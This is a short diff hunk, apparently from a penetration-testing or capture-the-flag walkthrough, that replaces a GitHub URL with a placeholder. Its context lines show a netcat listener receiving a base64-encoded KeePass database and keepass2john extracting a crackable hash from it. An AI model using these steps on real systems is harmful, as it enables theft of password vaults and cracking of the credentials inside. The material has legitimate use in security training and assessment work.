@@ -253,7 +253,7 @@ nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
 keepass2john system.kdbx > hash.txt
 
 # For KeePass v4 (KDBX 4.x with Argon2): use custom fork
-git clone https://github.com/ivanmrsulja/keepass2john.git
+git clone [upstream-repo]
 cd keepass2john && make
 ./keepass2john system.kdbx > hash.txt
 
